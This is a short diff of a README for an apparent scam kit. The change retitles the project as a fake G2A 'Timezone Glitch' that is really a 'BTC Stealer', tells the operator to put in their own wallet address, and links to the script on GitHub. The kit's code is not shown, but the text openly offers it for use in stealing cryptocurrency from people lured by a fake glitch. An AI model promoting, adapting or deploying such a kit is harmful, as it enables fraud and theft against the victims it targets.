@@ -1,4 +1,4 @@
-# fake-g2a-timezone-glitch
+# G2A Fake "Timezone Glitch" - BTC Stealer - Replace address to your own
 
 Go to https://github.com/g2aexploit/fake-g2a-timezone-glitch/blob/main/script.js
 
